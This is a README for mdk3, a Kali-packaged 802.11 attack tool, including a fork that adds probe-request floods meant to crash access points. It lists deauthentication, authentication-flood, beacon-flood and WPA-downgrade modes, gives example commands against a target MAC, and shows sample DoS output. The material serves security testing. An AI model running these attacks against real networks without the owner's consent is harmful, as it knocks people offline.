# mdk3
mdk3 repository imported from kali linux's git server (	git://git.kali.org/packages/mdk3.git). Import date 19/07/2016.

The rest of readme is from https://github.com/charlesxsh/mdk3-master

#Overview

These modifications were not made by me, they were made by a Musket Developer that I have been working with. 
I have been given permission to share it with the public.
This version of MDK3 has a new feature that sends directed probe requests with invalid SSID characters to an AP.
The hope is that if enough probes are sent, the AP will lock up and reboot.
This tool should only be used for experimenting with the security of your own wireless network.

#Installation

    cd /mdk3-master
    make
    sudo make install

#Usage
    MDK 3.0 v6(mod-musket-r1) - "fuck the censorship"
    by ASPj of k2wrlz, using the osdep library from aircrack-ng
    And with lots of help from the great aircrack-ng community:
    Antragon, moongray, Ace, Zero_Chaos, Hirte, thefkboss, ducttape,
    telek0miker, Le_Vert, sorbo, Andy Green, bahathir and Dawid Gajownik
    THANK YOU!

    MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.
    IMPORTANT: It is your responsibility to make sure you have permission from the
    network owner before running MDK against it.

    This code is licenced under the GPLv2

    MDK USAGE:
    mdk3 <interface> <test_mode> [test_options]

    Try mdk3 --fullhelp for all test options
    Try mdk3 --help <test_mode> for info about one test only

    TEST MODES:
    b   - Beacon Flood Mode
      Sends beacon frames to show fake APs at clients.
      This can sometimes crash network scanners and even drivers!
    a   - Authentication DoS mode
      Sends authentication frames to all APs found in range.
      Too much clients freeze or reset some APs.
    p   - Basic probing and ESSID Bruteforce mode
      Probes AP and check for answer, useful for checking if SSID has
      been correctly decloaked or if AP is in your adaptors sending range
      SSID Bruteforcing is also possible with this test mode.
    d   - Deauthentication / Disassociation Amok Mode
      Kicks everybody found from AP
    m   - Michael shutdown exploitation (TKIP)
      Cancels all traffic continuously
    x   - 802.1X tests
    w   - WIDS/WIPS Confusion
      Confuse/Abuse Intrusion Detection and Prevention Systems
    f   - MAC filter bruteforce mode
      This test uses a list of known client MAC Adresses and tries to
      authenticate them to the given AP while dynamically changing
      its response timeout for best performance. It currently works only
      on APs who deny an open authentication request properly
    g   - WPA Downgrade test
      deauthenticates Stations and APs sending WPA encrypted packets.
      With this test you can check if the sysadmin will try setting his
      network to WEP or disable encryption.
    t   - Probe Request Tests (mod-musket)
      mdk3 <mon> t <channel> <bssid AP> <frames/sec>

#Example Usage
        mdk3 mon0 t 11 00:11:22:33:44:55 50
        mdk3 wlan0mon t 11 00:11:22:33:44:55 50
mon0/wlan0mon is the monitor interface, t is Probe Request Mode, 11 is channel 11, 00:11:22... is the target's MAC Address, and 50 is the packets per second.

#Contributions
A big thanks to the Musket Developer who added this new test option to MDK3 :D


The following lines are from http://tools.kali.org/wireless-attacks/mdk3

#mdk3 Usage Example

Use the wireless interface (wlan0) to run the Authentication DoS mode test (a):

```
root@kali:~# mdk3 wlan0 a

Trying to get a new target AP...                  
AP 9C:D3:6D:B8:FF:56 is responding!          
Connecting Client: 00:00:00:00:00:00 to target AP: 9C:D3:6D:B8:FF:56
Connecting Client: 00:00:00:00:00:00 to target AP: 9C:D3:6D:B8:FF:56
AP 9C:D3:6D:B8:FF:56 seems to be INVULNERABLE!      
Device is still responding with   500 clients connected!
Trying to get a new target AP...                  
AP E0:3F:49:6A:57:78 is responding!          
Connecting Client: 00:00:00:00:00:00 to target AP: E0:3F:49:6A:57:78
AP E0:3F:49:6A:57:78 seems to be INVULNERABLE!
```
